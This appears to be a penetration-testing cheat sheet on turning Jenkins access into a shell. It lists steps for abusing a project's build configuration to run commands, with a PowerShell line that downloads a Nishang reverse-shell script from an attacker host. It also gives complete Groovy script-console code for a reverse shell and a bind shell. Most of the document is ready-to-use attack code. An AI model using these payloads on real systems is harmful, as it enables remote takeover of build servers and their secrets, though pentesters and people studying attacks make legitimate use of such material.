# Jenkins

### Through Existing Project

1. First get access to jenkins login panel and then login
2. Under Project Options, there is a configure tab which allows to execute system commands
3. You can put a reverse shell payload there
   * ```powershell
     powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
     ```
   * You first need to download the [Powershell script](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1), and make it available for the server to download. You can do this by creating a http server with python: `python3 -m http.server`
4. After Re-Building the project, your malicious reverse shell code would be executed



### Reverse Shell through Groovy Scripting Console

```powershell
String host="localIP";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```



### Bind Shell through Groovy Scripting Console

Bind shell is useful in case we have used pivoting technique and the target does not know how to communicate back to us

```powershell
int port=5555;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new java.net.ServerSocket(port).accept()
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
